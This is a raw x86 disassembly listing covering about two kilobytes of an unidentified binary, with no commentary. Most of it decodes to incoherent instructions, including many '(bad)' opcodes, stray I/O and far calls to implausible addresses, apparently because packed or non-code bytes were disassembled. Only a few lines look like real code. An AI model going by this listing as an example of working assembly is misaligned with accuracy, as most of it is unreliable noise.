  4144d6:	bound  ecx,QWORD PTR [ebx+0x50]
  4144d9:	jno    0x4144d4
  4144db:	or     ebx,eax
  4144dd:	mov    dl,0x1e
  4144df:	(bad)  
  4144e0:	popa   
  4144e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4144e2:	dec    ecx
  4144e3:	pop    ebx
  4144e4:	jle    0x414471
  4144e6:	loopne 0x41455e
  4144e8:	fwait
  4144e9:	add    bl,BYTE PTR [esi]
  4144eb:	dec    edi
  4144ec:	leave  
  4144ed:	lock xlat BYTE PTR ds:[ebx]
  4144ef:	xor    eax,0x42cdd3d4
  4144f4:	imul   esp,DWORD PTR gs:[ecx],0x7f
  4144f8:	(bad)  
  4144f9:	mov    al,ds:0xcde653e3
  4144fe:	xchg   BYTE PTR [eax],ch
  414500:	inc    dl
  414502:	je     0x41448f
  414504:	lods   eax,DWORD PTR ds:[esi]
  414505:	and    BYTE PTR [edx+0x43],dl
  414508:	loopne 0x414495
  41450a:	mov    edx,0x32f94f0e
  41450f:	fdivr  QWORD PTR [ecx+0x2c3f3d33]
  414515:	adc    ch,cl
  414517:	leave  
  414518:	mov    DWORD PTR [ebp-0x401d14e7],ebx
  41451e:	outs   dx,DWORD PTR ds:[esi]
  41451f:	(bad)  
  414520:	mul    BYTE PTR [edi]
  414522:	pop    ecx
  414523:	and    BYTE PTR [edx-0x7c2c1d0c],bh
  414529:	or     ah,dl
  41452b:	mov    ebp,0x4b1e49e
  414530:	fist   DWORD PTR [edx]
  414532:	inc    edi
  414533:	add    ebp,DWORD PTR [ebp+0x3f]
  414536:	sbb    al,0x95
  414538:	add    ah,BYTE PTR [ebx-0x6c286364]
  41453e:	jo     0x41452f
  414540:	adc    al,cl
  414542:	int3   
  414543:	jl     0x4145a7
  414545:	lds    esp,FWORD PTR [esi+0x4d4a78fb]
  41454b:	call   0xc69732f
  414550:	lidtd  [edx+0xe227974]
  414557:	popa   
  414558:	pop    ds
  414559:	(bad)  
  41455a:	(bad)  [ebp-0x6b]
  41455d:	and    eax,0xf10365f2
  414562:	sub    cl,al
  414564:	adc    DWORD PTR [ebp-0x4d],ecx
  414567:	xor    al,0xdd
  414569:	push   eax
  41456a:	pop    esi
  41456b:	bound  ebx,QWORD PTR [edi+0x7]
  41456e:	mov    ch,0x86
  414570:	sub    DWORD PTR [ebx],esp
  414572:	retf   0xeffa
  414575:	inc    ebx
  414576:	rcr    edx,1
  414578:	mov    ch,0x81
  41457a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41457b:	mov    ecx,0xdcf7652f
  414580:	call   0x8159:0x1998f6f7
  414587:	mov    esp,0xa6b19bd1
  41458c:	pop    edi
  41458d:	mov    cl,0xbd
  41458f:	mov    dh,ah
  414591:	cmc    
  414592:	pop    es
  414593:	test   eax,0x8bd2af0f
  414598:	add    eax,0x7695ce69
  41459d:	xor    DWORD PTR [esi+0x8bd8890],edi
  4145a3:	inc    ebx
  4145a4:	sbb    eax,0xd836ca14
  4145a9:	dec    edi
  4145aa:	mov    ds,ebp
  4145ac:	inc    ecx
  4145ad:	xchg   DWORD PTR [ebp+0x3b],edi
  4145b0:	mov    ecx,0x26da332c
  4145b5:	mov    ax,0x1ae8
  4145b9:	(bad)  
  4145ba:	xor    eax,0x2eb1e17f
  4145bf:	cld    
  4145c0:	in     al,dx
  4145c1:	xor    al,0xf1
  4145c3:	test   al,0xb4
  4145c5:	jl     0x414586
  4145c7:	mov    dl,0xf9
  4145c9:	les    edx,FWORD PTR [edx+0x20]
  4145cc:	mov    eax,0x9e9dc831
  4145d1:	push   ebp
  4145d2:	in     eax,dx
  4145d3:	into   
  4145d4:	inc    esi
  4145d5:	pop    ebx
  4145d6:	mov    al,ah
  4145d8:	(bad)  
  4145d9:	adc    eax,DWORD PTR [edx+0x3f5d42f1]
  4145df:	cs cmp eax,0x266869ac
  4145e5:	into   
  4145e6:	lods   eax,DWORD PTR ds:[esi]
  4145e7:	xchg   BYTE PTR [ebx-0x57],bh
  4145ea:	retf   0xc735
  4145ed:	out    0x1b,al
  4145ef:	jmp    0x493f47b6
  4145f4:	jmp    0x4145e0
  4145f6:	jne    0x414606
  4145f8:	adc    BYTE PTR [edi+0x5079c376],dl
  4145fe:	mov    ecx,0xa313b22e
  414603:	cli    
  414604:	stos   BYTE PTR es:[edi],al
  414605:	mov    cl,0xd7
  414607:	hlt    
  414608:	cwde   
  414609:	ins    BYTE PTR es:[edi],dx
  41460a:	push   cs
  41460b:	cmp    DWORD PTR [ebp+0x2a],esp
  41460e:	push   esp
  41460f:	fdivr  DWORD PTR [ebx+0x33]
  414612:	(bad)  
  414613:	jnp    0x41460f
  414615:	mov    eax,ds:0xa1f61e80
  41461a:	loop   0x4145d8
  41461c:	pop    ebp
  41461d:	test   DWORD PTR [edx],edx
  41461f:	push   0x250b1e5a
  414624:	sub    eax,0xcda6969d
  414629:	outs   dx,DWORD PTR ds:[esi]
  41462a:	mul    bh
  41462c:	sbb    al,0xdd
  41462e:	jno    0x41463a
  414630:	repnz sar DWORD PTR [edx-0x30d1ecf0],cl
  414637:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414638:	sbb    ch,dl
  41463a:	cwde   
  41463b:	xor    BYTE PTR [edx+0x17],0x1a
  41463f:	cvtps2pi mm6,QWORD PTR [ebx+0x1b]
  414643:	frstor [edi-0x34]
  414646:	not    DWORD PTR [ecx+0x7c]
  414649:	jecxz  0x41467b
  41464b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41464c:	out    0x25,eax
  41464e:	inc    ecx
  41464f:	sub    ebp,eax
  414651:	xchg   edi,eax
  414652:	push   es
  414653:	cmp    esp,DWORD PTR [eax+0x34]
  414656:	jns    0x41460b
  414658:	mov    al,ds:0xaf0f9392
  41465d:	xlat   BYTE PTR ds:[ebx]
  41465e:	mov    edi,DWORD PTR [ebp-0x18]
  414661:	jmp    0x4148e9
  414666:	retf   
  414667:	ret    0xd23d
  41466a:	vpand  xmm3,xmm5,xmm1
  41466e:	ret    0xb492
  414671:	adc    BYTE PTR [eax-0x514655ad],0xf
  414678:	jg     0x4146f2
  41467a:	in     eax,0x7e
  41467c:	js     0x4146f6
  41467e:	jno    0x41462a
  414680:	xchg   esp,eax
  414681:	das    
  414682:	push   ecx
  414683:	add    DWORD PTR [eax-0x54070603],ebx
  414689:	inc    ecx
  41468a:	pusha  
  41468b:	ds pop ebx
  41468d:	cmp    BYTE PTR [edx+edi*8-0x19],bh
  414691:	call   DWORD PTR [ebx-0x26373b22]
  414697:	xchg   edi,eax
  414698:	push   eax
  414699:	dec    ecx
  41469a:	inc    esp
  41469b:	les    esi,FWORD PTR [eax-0x41]
  41469e:	dec    esi
  41469f:	call   0x3b2ded1d
  4146a4:	jl     0x414643
  4146a6:	xor    DWORD PTR [ebp-0x18],ecx
  4146a9:	sbb    bh,BYTE PTR [eax-0x5d]
  4146ac:	call   ecx
  4146ae:	inc    DWORD PTR [edi+0x286042a0]
  4146b4:	sub    BYTE PTR [ecx],0xdb
  4146b7:	adc    DWORD PTR [eax+esi*4-0x7d],ecx
  4146bb:	stos   BYTE PTR es:[edi],al
  4146bc:	add    ah,BYTE PTR [eax+0x1c]
  4146bf:	addr16 (bad) 
  4146c1:	mov    ebp,0x1c0d6693
  4146c6:	xor    DWORD PTR [ebx+edi*4+0xeae5461],edi
  4146cd:	mov    esp,0x8d9cd5a7
  4146d2:	addr16 (bad) 
  4146d4:	popa   
  4146d5:	daa    
  4146d6:	cmp    BYTE PTR [ebx+0x1be92a83],al
  4146dc:	sbb    BYTE PTR [eax-0x76],dh
  4146df:	inc    esi
  4146e0:	(bad)  
  4146e1:	data16 scas al,BYTE PTR es:[edi]
  4146e3:	dec    ecx
  4146e4:	test   BYTE PTR [edi+0x8a8160f],dh
  4146ea:	cmp    ecx,DWORD PTR ds:0xad86f1ef
  4146f0:	(bad)  
  4146f1:	icebp  
  4146f2:	sti    
  4146f3:	pop    esp
  4146f4:	jne    0x41475d
  4146f6:	fwait
  4146f7:	cmp    cl,BYTE PTR [edx+0x18eca090]
  4146fd:	stc    
  4146fe:	or     bl,dh
  414700:	inc    esi
  414701:	std    
  414702:	(bad)  
  414703:	lock pop ebx
  414705:	fadd   QWORD PTR [edx]
  414707:	(bad)  
  414708:	jno    0x414737
  41470a:	mov    bl,0x94
  41470c:	push   esp
  41470d:	lods   al,BYTE PTR ds:[esi]
  41470e:	outs   dx,BYTE PTR ds:[esi]
  41470f:	pop    edi
  414710:	out    dx,eax
  414711:	mov    al,0x76
  414713:	inc    esi
  414714:	and    eax,0x55039900
  414719:	popa   
  41471a:	pop    edi
  41471b:	xchg   ebp,eax
  41471c:	add    BYTE PTR [edx+0x3f],bl
  41471f:	dec    esp
  414720:	mov    eax,0xdb011dcf
  414725:	popf   
  414726:	pushf  
  414727:	fistp  QWORD PTR [edi-0xb]
  41472a:	test   DWORD PTR [ecx+0x66],esp
  41472d:	xchg   ebp,eax
  41472e:	cld    
  41472f:	push   ebp
  414730:	xchg   ch,bh
  414732:	mov    BYTE PTR [edi+edx*8-0x26ade68b],0x7d
  41473a:	xor    al,0xd1
  41473c:	mov    eax,0x456d3916
  414741:	fimul  WORD PTR [ebx+edi*2-0x52533e0e]
  414748:	adc    eax,0xb43948c2
  41474d:	fadd   QWORD PTR [esi+0x65]
  414750:	(bad)  
  414752:	lods   eax,DWORD PTR ds:[esi]
  414753:	push   edi
  414754:	xor    BYTE PTR [esi],dh
  414756:	push   0xffffffd1
  414758:	or     cl,BYTE PTR [eax-0x11ff1297]
  41475e:	mov    bl,0xc2
  414760:	cmp    edx,esi
  414762:	or     DWORD PTR [ebx+0x7ea438cb],esi
  414768:	loope  0x4147a6
  41476a:	xchg   edi,eax
  41476b:	xchg   edi,eax
  41476c:	loope  0x4147ce
  41476e:	add    eax,0x60e4966
  414773:	addr16 not esi
  414776:	pop    esi
  414777:	mov    BYTE PTR [ebx-0x1aff70e7],cl
  41477d:	cs pop edi
  41477f:	imul   esp,DWORD PTR [edx],0xffffffe9
  414782:	cmp    bl,BYTE PTR [eax]
  414784:	cld    
  414785:	dec    esi
  414786:	fisubr DWORD PTR [ebp-0x1d]
  414789:	sahf   
  41478a:	jb     0x414729
  41478c:	aaa    
  41478d:	call   0xf95c:0x907a5b8e
  414794:	mov    dl,0x5c
  414796:	ja     0x414731
  414798:	ins    DWORD PTR es:[edi],dx
  414799:	pop    esp
  41479a:	pop    edi
  41479b:	mov    ds:0x6f0f2c88,al
  4147a0:	in     eax,dx
  4147a1:	pop    ecx
  4147a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4147a3:	jnp    0x4147fa
  4147a5:	sub    ecx,0xa87cda2b
  4147ab:	push   ebx
  4147ac:	ret    
  4147ad:	rcl    esi,cl
  4147af:	push   esi
  4147b0:	push   edx
  4147b1:	cmp    DWORD PTR [esi+0x63609f5c],esi
  4147b7:	jge    0x4147d1
  4147b9:	sbb    BYTE PTR [eax],al
  4147bb:	dec    edx
  4147bc:	arpl   WORD PTR ds:[edx],cx
  4147bf:	pusha  
  4147c0:	(bad)  
  4147c2:	mov    ds:0xad8b6e0e,eax
  4147c7:	into   
  4147c8:	(bad)  
  4147c9:	shl    esi,cl
  4147cb:	or     cl,BYTE PTR [edi-0x42]
  4147ce:	cmp    ebp,DWORD PTR [edi]
  4147d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4147d1:	scas   al,BYTE PTR es:[edi]
  4147d2:	not    esi
  4147d4:	sub    DWORD PTR ds:0x49261175,0x5a3b88c7
  4147de:	inc    ebx
  4147df:	ror    DWORD PTR ds:0x7b5eecf9,0xa7
  4147e6:	mov    eax,0x73037afe
  4147eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4147ec:	dec    ebx
  4147ed:	pop    ebp
  4147ee:	and    eax,eax
  4147f0:	clc    
  4147f1:	lock and BYTE PTR [edx],cl
  4147f4:	inc    ebp
  4147f5:	xchg   ebx,eax
  4147f6:	mov    BYTE PTR [ecx],al
  4147f8:	inc    edi
  4147f9:	sahf   
  4147fa:	adc    al,0xd8
  4147fc:	jbe    0x414816
  4147fe:	retf   
  4147ff:	mov    edx,0xdf6c3b13
  414804:	mov    bh,BYTE PTR [edx+eax*8-0x43abf451]
  41480b:	add    DWORD PTR [ebx-0x69],0x2fb34066
  414812:	mov    cl,0xfb
  414814:	cli    
  414815:	pop    es
  414816:	push   0x30
  414818:	jg     0x414844
  41481a:	pusha  
  41481b:	mov    DWORD PTR [edx],ecx
  41481d:	jmp    0x41486c
  41481f:	das    
  414820:	imul   edx,DWORD PTR [esp+ecx*4-0x7d],0x1689161a
  414828:	scas   al,BYTE PTR es:[edi]
  414829:	pop    eax
  41482a:	xchg   edx,eax
  41482b:	cli    
  41482c:	fisubr WORD PTR [ecx-0x14f7af1b]
  414832:	rcr    BYTE PTR [ebp+0xbd29bbe],cl
  414838:	xchg   ebp,eax
  414839:	loop   0x4147e5
  41483b:	adc    edi,DWORD PTR [ebx-0x4]
  41483e:	out    0x38,al
  414840:	outs   dx,DWORD PTR ds:[esi]
  414841:	pop    edx
  414842:	cdq    
  414843:	mov    ds:0xc8407486,al
  414848:	add    ebp,eax
  41484a:	push   eax
  41484b:	adc    eax,0xc833dbce
  414850:	mov    ebp,0x1e619419
  414855:	xchg   DWORD PTR [edi+0x18d998ee],edx
  41485b:	stos   BYTE PTR es:[edi],al
  41485c:	mov    ebx,0xf3de3a50
  414861:	je     0x41486a
  414863:	add    al,0x89
  414865:	mov    bl,0xde
  414867:	(bad)  
  414868:	pop    ds
  414869:	loopne 0x41480f
  41486b:	gs ins BYTE PTR es:[edi],dx
  41486d:	add    DWORD PTR [edx+0x6b0a797c],ecx
  414873:	adc    ebx,DWORD PTR [ebx-0x750d43b4]
  414879:	popa   
  41487a:	mov    al,ds:0x70cf199a
  41487f:	dec    edi
  414880:	pop    esi
  414881:	xor    al,0xd3
  414883:	add    DWORD PTR [ebx],ebp
  414885:	xor    DWORD PTR [edi],esp
  414887:	shl    BYTE PTR [ebp+0x35],cl
  41488a:	aaa    
  41488b:	jl     0x4148e1
  41488d:	jge    0x4148bc
  41488f:	mov    ds:0x661b3d02,al
  414894:	mov    cl,0x36
  414896:	xchg   esi,ebx
  414898:	fist   DWORD PTR [esi+esi*1]
  41489b:	lahf   
  41489c:	sub    BYTE PTR [esi+edi*8],ah
  41489f:	jecxz  0x41483b
  4148a1:	retf   
  4148a2:	jnp    0x414913
  4148a4:	push   es
  4148a5:	inc    edx
  4148a6:	add    bl,BYTE PTR [ebx+0x7e]
  4148a9:	pop    ds
  4148aa:	sub    ebx,edi
  4148ac:	mov    ah,0x25
  4148ae:	lds    edi,FWORD PTR [eax+0x2b823dcd]
  4148b4:	jno    0x4148d8
  4148b6:	mov    BYTE PTR [edi],ch
  4148b8:	or     al,0x7e
  4148ba:	fs fsubr st(2),st
  4148bd:	push   0x63e511c0
  4148c2:	int3   
  4148c3:	xor    al,0x76
  4148c5:	dec    ecx
  4148c6:	xor    al,bh
  4148c8:	int3   
  4148c9:	jge    0x414851
  4148cb:	pop    ebx
  4148cc:	jnp    0x4148db
  4148ce:	rol    ecx,cl
  4148d0:	scas   al,BYTE PTR es:[edi]
  4148d1:	jmp    0x41487d
  4148d3:	out    dx,eax
  4148d4:	xchg   esi,eax
  4148d5:	outs   dx,BYTE PTR ds:[esi]
  4148d6:	aad    0x42
  4148d8:	lods   al,BYTE PTR ds:[esi]
  4148d9:	push   esp
  4148da:	mov    eax,DWORD PTR [edi]
  4148dc:	sbb    BYTE PTR [ecx+eiz*8],ch
  4148df:	(bad)  
  4148e0:	stos   DWORD PTR es:[edi],eax
  4148e1:	push   edx
  4148e2:	call   0x21e9:0x3ef66b66
  4148e9:	xor    edi,eax
  4148eb:	add    edx,edi
  4148ed:	mov    edi,DWORD PTR [ebp-0x8]
  4148f0:	lea    edx,[edx+edi*1+0x327298]
  4148f7:	mov    DWORD PTR [ebp-0x8],edx
  4148fa:	mov    edx,DWORD PTR [ebp-0x20]
  4148fd:	xor    edx,eax
  4148ff:	mov    edi,0xffcd8d68
  414904:	sub    edi,edx
  414906:	add    edi,DWORD PTR [ebp-0x10]
  414909:	mov    edx,DWORD PTR [ebp-0x20]
  41490c:	mov    ebx,DWORD PTR [ebp-0x8]
  41490f:	jmp    0x414b97
  414914:	rcl    bh,0xc5
  414917:	(bad)  
  414918:	aad    0xda
  41491a:	leave  
  41491b:	(bad)  [eax+0x3927854b]
  414921:	arpl   WORD PTR [edx+0x7f],si
  414924:	sbb    ecx,DWORD PTR [edi+edi*2]
  414927:	js     0x41490e
  414929:	jle    0x4149a3
  41492b:	js     0x4148ad
  41492d:	outs   dx,DWORD PTR ds:[esi]
  41492e:	add    edi,DWORD PTR [di]
  414931:	jle    0x41490c
  414933:	and    eax,0x237fa288
  414938:	xchg   ecx,eax
  414939:	xor    dx,bx
  41493c:	dec    esi
  41493d:	xor    DWORD PTR ds:0xda6dc927,0xffffff8c
  414944:	dec    esp
  414945:	fidivr WORD PTR es:[edi+0x6c]
  414949:	loope  0x414923
  41494b:	jle    0x414947
  41494d:	ins    BYTE PTR es:[edi],dx
  41494e:	lods   al,BYTE PTR ds:[esi]
  41494f:	push   ebp
  414950:	and    eax,DWORD PTR [edi]
  414952:	sar    bl,0x7e
  414955:	dec    edx
  414956:	popf   
  414957:	ret    
  414958:	clc    
  414959:	fnsave [edi-0x4e]
  41495c:	call   0x71fc:0x4b6dff7b
  414963:	mov    WORD PTR [eax+0x61],ss
  414966:	popf   
  414967:	(bad)  
  414968:	xchg   esp,eax
  414969:	(bad)  
  41496a:	ss clc 
  41496c:	pop    es
  41496d:	xor    ch,BYTE PTR [edx+ebx*8]
  414970:	fdivp  st(5),st
  414972:	push   DWORD PTR [esi-0x34b17b8b]
  414978:	sub    DWORD PTR [esi-0x701c4a85],esi
  41497e:	cmp    eax,0xb0d6d9ad
  414984:	sahf   
  414985:	mov    dl,0x68
  414987:	faddp  st(1),st
  414989:	mov    ch,BYTE PTR [ecx+0x3b]
  41498c:	pushf  
  41498d:	(bad)  
  41498e:	and    eax,0xba95c99e
  414993:	xchg   ecx,eax
  414994:	sbb    edi,ecx
  414996:	dec    ebp
  414997:	(bad)  
  414998:	jne    0x4149e6
  41499a:	sbb    esi,DWORD PTR [esi]
  41499c:	sbb    al,0xfd
  41499e:	and    eax,0x891f4861
  4149a3:	inc    edi
  4149a4:	xchg   DWORD PTR ds:0xbfd6519d,edx
  4149aa:	cli    
  4149ab:	mov    ecx,0xbfb566ab
  4149b0:	mov    ds:0xdf458df,al
  4149b5:	fwait
  4149b6:	cmp    eax,0xbb3795c4
  4149bb:	out    dx,eax
  4149bc:	imul   edi,DWORD PTR [edi],0x4f10b79e
  4149c2:	or     DWORD PTR [eax-0x6f7af5e],0x10
  4149c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149ca:	and    WORD PTR [ebx+0x5fdfed57],ax
  4149d1:	shr    DWORD PTR [esi-0x560ef799],cl
  4149d7:	sahf   
  4149d8:	fwait
  4149d9:	mov    bh,0x43
  4149db:	jbe    0x414a1e
  4149dd:	or     al,0x24
  4149df:	mov    dh,0xb3
  4149e1:	or     DWORD PTR [esi+0x1b],ebx
  4149e4:	imul   edi,DWORD PTR [ecx],0xf7f4492a
  4149ea:	daa    
  4149eb:	add    edi,DWORD PTR [ecx-0x5149b6f8]
  4149f1:	rol    al,cl
  4149f3:	cmc    
  4149f4:	mov    ds:0xe8fba4e1,al
  4149f9:	adc    BYTE PTR [ecx-0x78],cl
  4149fc:	fmul   QWORD PTR [ecx-0x7e699758]
  414a02:	stos   BYTE PTR es:[edi],al
  414a03:	inc    esi
  414a04:	test   al,0xa7
  414a06:	into   
  414a07:	mov    dh,0x5c
  414a09:	mov    dh,0x7c
  414a0b:	in     al,dx
  414a0c:	jmp    0x4149ad
  414a0e:	(bad)  
  414a0f:	loopne 0x414a58
  414a11:	test   BYTE PTR [edx-0x64],bl
  414a14:	mov    ebx,DWORD PTR [esi]
  414a16:	(bad)  
  414a17:	xor    al,0xd2
  414a19:	jae    0x4149bd
  414a1b:	inc    ecx
  414a1c:	xor    BYTE PTR [ebx],dl
  414a1e:	mov    cl,0xc7
  414a20:	test   DWORD PTR [esi],edi
  414a22:	test   eax,0x830b7aed
  414a27:	stc    
  414a28:	sub    eax,0xa0b92cf9
  414a2d:	adc    esi,DWORD PTR [ebx+ecx*8]
  414a30:	ins    BYTE PTR es:[edi],dx
  414a31:	cmp    ah,BYTE PTR [ebx+edi*8-0x35]
  414a35:	add    BYTE PTR [ecx],bh
  414a37:	retf   
  414a38:	xor    DWORD PTR [ebx+ebx*2],ecx
  414a3b:	(bad)  
  414a3c:	in     eax,0x5c
  414a3e:	jge    0x414aa7
  414a40:	ja     0x414a37
  414a42:	nop
  414a43:	loopne 0x414a62
  414a45:	fwait
  414a46:	ds sbb al,0x31
  414a49:	mov    bl,0xa3
  414a4b:	not    BYTE PTR [edx]
  414a4d:	outs   dx,BYTE PTR ds:[esi]
  414a4e:	adc    BYTE PTR [ebx+0x4],dh
  414a51:	cmp    eax,0xfff676b
  414a56:	mov    DWORD PTR [esi-0x1b3ec1d6],esp
  414a5c:	and    cl,BYTE PTR [ebx-0x67]
  414a5f:	adc    DWORD PTR [ebx],esi
  414a61:	fdivr  QWORD PTR ds:0x2a9e9c9
  414a67:	mov    dh,0x7
  414a69:	sub    eax,DWORD PTR [edx-0x2c6466dd]
  414a6f:	jge    0x414aa6
  414a71:	loope  0x414ac4
  414a73:	xchg   edi,eax
  414a74:	inc    esi
  414a75:	pop    esp
  414a76:	and    esp,DWORD PTR [esi+0x32587951]
  414a7c:	std    
  414a7d:	and    eax,esp
  414a7f:	jmp    0x414a3f
  414a81:	stos   DWORD PTR es:[edi],eax
  414a82:	lods   eax,DWORD PTR ds:[esi]
  414a83:	out    dx,eax
  414a84:	mov    edx,0xfeb3d1c3
  414a89:	ret    
  414a8a:	test   edx,edx
  414a8c:	leave  
  414a8d:	xor    BYTE PTR [bp+0x43],ch
  414a91:	fs jp  0x414add
  414a94:	iret   
  414a95:	pop    ds
  414a96:	xor    BYTE PTR [ecx],dh
  414a98:	jne    0x414a9d
  414a9a:	sar    DWORD PTR [ebx],0x36
  414a9d:	sbb    BYTE PTR [ecx],ch
  414a9f:	jg     0x414ad3
  414aa1:	jle    0x414aba
  414aa3:	xor    BYTE PTR [esi],bh
  414aa5:	jbe    0x414a82
  414aa7:	push   esi
  414aa8:	out    dx,eax
  414aa9:	adc    DWORD PTR [ebx],esp
  414aab:	pop    esp
  414aac:	sar    DWORD PTR [edx],cl
  414aae:	fcomp  DWORD PTR [ecx]
  414ab0:	aas    
  414ab1:	mov    ebx,0xdb509d79
  414ab6:	mov    al,0x5d
  414ab8:	mov    cl,0x6f
  414aba:	adc    eax,0xaf257f35
  414abf:	shl    DWORD PTR [ebp+eiz*8+0x48],cl
  414ac3:	lods   eax,DWORD PTR ds:[esi]
  414ac4:	icebp  
  414ac5:	ins    BYTE PTR es:[edi],dx
  414ac6:	jne    0x414ab8
  414ac8:	jnp    0x414a9a
  414aca:	shl    BYTE PTR [ebx-0x2481cd9a],cl
  414ad0:	xlat   BYTE PTR ds:[ebx]
  414ad1:	iret   
  414ad2:	rcr    DWORD PTR [ebx],0xed
  414ad5:	neg    esp
  414ad7:	fstp   QWORD PTR [ecx+ebx*4+0x7327bf64]
  414ade:	outs   dx,BYTE PTR ds:[esi]
  414adf:	int3   
  414ae0:	das    
  414ae1:	retf   
  414ae2:	jmp    0x414b5d
  414ae4:	cwde   
  414ae5:	push   eax
  414ae6:	cmp    al,0x11
  414ae8:	icebp  
  414ae9:	enter  0x813d,0xec
  414aed:	sbb    BYTE PTR [ecx-0x9],dl
  414af0:	dec    ebx
  414af1:	fst    DWORD PTR [edi+0x5195e69e]
  414af7:	cmp    esi,0xada526ce
  414afd:	dec    esi
  414afe:	outs   dx,DWORD PTR ds:[esi]
  414aff:	fisub  WORD PTR [eax+0x11ef8709]
  414b05:	jnp    0x414adc
  414b07:	sub    BYTE PTR [ebx+ecx*1+0x5560e188],0xff
  414b0f:	push   esp
  414b10:	shr    DWORD PTR [edx-0x3],1
  414b13:	sbb    BYTE PTR [ebp-0x19],0xaa
  414b17:	inc    esi
  414b18:	push   ecx
  414b19:	int3   
  414b1a:	xlat   BYTE PTR ds:[ebx]
  414b1b:	pop    ecx
  414b1c:	clc    
  414b1d:	icebp  
  414b1e:	scas   al,BYTE PTR es:[edi]
  414b1f:	sbb    esp,ebp
  414b21:	out    dx,al
  414b22:	loop   0x414b5c
  414b24:	stos   DWORD PTR es:[edi],eax
  414b25:	setge  BYTE PTR [eax+0x76e31fed]
  414b2c:	dec    esi
  414b2d:	jle    0x414ac8
  414b2f:	push   ebx
  414b30:	mov    edx,0x75a34c13
  414b35:	xchg   esp,eax
  414b36:	and    eax,0xcb3e4799
  414b3b:	pop    eax
  414b3c:	add    dl,BYTE PTR [ebx+0x7e8ba665]
  414b42:	xor    eax,0xd3508b7f
  414b47:	std    
  414b48:	test   DWORD PTR [eax*2-0x6e39ddd2],esi
  414b4f:	ret    0x3852
  414b52:	adc    ebp,DWORD PTR [esi]
  414b54:	mov    DWORD PTR [eax+0x46de5178],esi
  414b5a:	aad    0x32
  414b5c:	inc    ebx
  414b5d:	movups xmm2,XMMWORD PTR [edi-0x32]
  414b61:	xor    cl,BYTE PTR [eax+edi*8]
  414b64:	(bad)  
  414b65:	cli    
  414b66:	and    eax,DWORD PTR [ecx+0x1f7ceced]
  414b6c:	xchg   BYTE PTR [ecx],dl
  414b6e:	int    0x89
  414b70:	retf   
  414b71:	sub    ebx,DWORD PTR [edi+0x58a205bf]
  414b77:	pop    es
  414b78:	mov    ds:0xf63e1ea8,eax
  414b7d:	cmp    eax,0x89bb0b20
  414b82:	ret    0xe711
  414b85:	push   eax
  414b86:	xchg   edi,eax
  414b87:	inc    ebp
  414b88:	fcom   QWORD PTR [eax]
  414b8a:	lds    ebp,FWORD PTR [ebx-0x176be283]
  414b90:	in     al,0x30
  414b92:	cwde   
  414b93:	jb     0x414b7d
  414b95:	fnstenv es:[ebx]
  414b98:	rol    BYTE PTR [ebx],1
  414b9a:	ror    DWORD PTR [edi],1
  414b9c:	scas   eax,DWORD PTR es:[edi]
  414b9d:	sar    DWORD PTR [ebx],cl
  414b9f:	xlat   BYTE PTR ds:[ebx]
  414ba0:	jmp    0x414e28
  414ba5:	int    0xc1
  414ba7:	cmp    al,0xca
  414ba9:	int3   
  414baa:	leave  
  414bab:	aad    0xd9
  414bad:	xchg   esp,eax
  414bae:	mov    ch,0x6d
  414bb0:	dec    edx
  414bb1:	ins    DWORD PTR es:[edi],dx
  414bb2:	stos   BYTE PTR es:[edi],al
  414bb3:	push   esi
  414bb4:	pop    ebx
  414bb5:	adc    BYTE PTR [edx],0x7f
  414bb8:	js     0x414b9f
  414bba:	jle    0x414c34
  414bbc:	js     0x414bec
  414bbe:	jno    0x414b48
  414bc0:	xor    al,0x87
  414bc2:	in     eax,0x87
  414bc4:	(bad)  
  414bc5:	pop    ds
  414bc6:	mov    bl,0xa1
  414bc8:	cmp    al,BYTE PTR [edx-0x418b1c5f]
  414bce:	mov    ds:0xcb05c248,al
  414bd3:	pusha  
  414bd4:	xor    eax,0xfcf0d27e
  414bd9:	aas    
  414bda:	inc    eax
  414bdb:	xor    BYTE PTR [eax-0x5e90ea17],cl
  414be1:	mov    ebp,0x15f66cb0
  414be6:	enter  0x8437,0xb6
  414bea:	(bad)  
  414beb:	mov    ecx,0x9a53583c
  414bf0:	push   0x7867b7e5
  414bf5:	mov    al,ds:0xb0a44cbf
  414bfa:	and    ecx,DWORD PTR [edi-0x79]
  414bfd:	fcomip st,st(7)
  414bff:	push   ds
  414c00:	adc    al,bl
  414c02:	clc    
  414c03:	pop    edx
  414c04:	cmp    DWORD PTR [edi+0x3b4153b7],esp
  414c0a:	aas    
  414c0b:	lea    edi,[eax+0x544d12f5]
  414c11:	cmp    eax,DWORD PTR [esi]
  414c13:	cs inc ebp
  414c15:	out    0x16,eax
  414c17:	cs pop ecx
  414c19:	pusha  
  414c1a:	dec    ebp
  414c1b:	das    
  414c1c:	xlat   BYTE PTR ds:[ebx]
  414c1d:	jb     0x414bd5
  414c1f:	ror    DWORD PTR [esp+ebp*4],0x10
  414c23:	sahf   
  414c24:	xchg   ecx,eax
  414c25:	in     al,0xc7
  414c27:	sub    cl,BYTE PTR [esi+0x7f4f9686]
  414c2d:	cmp    eax,0x94bf62be
  414c32:	cmp    BYTE PTR [ebx+0x24],dl
  414c35:	adc    eax,0xf21beed6
  414c3a:	add    eax,0x8b83d76b
  414c3f:	cmp    DWORD PTR [edi-0x137a46d8],esi
  414c45:	add    BYTE PTR [edx],ch
  414c47:	adc    ebx,DWORD PTR [edx+0x52]
  414c4a:	dec    esp
  414c4b:	ins    DWORD PTR es:[edi],dx
  414c4c:	rol    ecx,cl
  414c4e:	jnp    0x414ca6
  414c50:	es out dx,eax
  414c52:	scas   eax,DWORD PTR es:[edi]
  414c53:	or     al,0xfe
  414c55:	pop    DWORD PTR [edx]
  414c57:	cmp    al,0xe8
  414c59:	mov    ds:0x72d35b99,al
  414c5e:	and    eax,0x29fa34e0
  414c63:	iret   
  414c64:	jae    0x414c42
  414c66:	loope  0x414ce1
  414c68:	jp     0x414cc0
  414c6a:	loopne 0x414c00
  414c6c:	push   eax
  414c6d:	dec    ecx
  414c6e:	mov    eax,0x8203f7ee
  414c73:	adc    eax,DWORD PTR [ebp+0x6aa3fd35]
  414c79:	test   eax,0xb75ff36
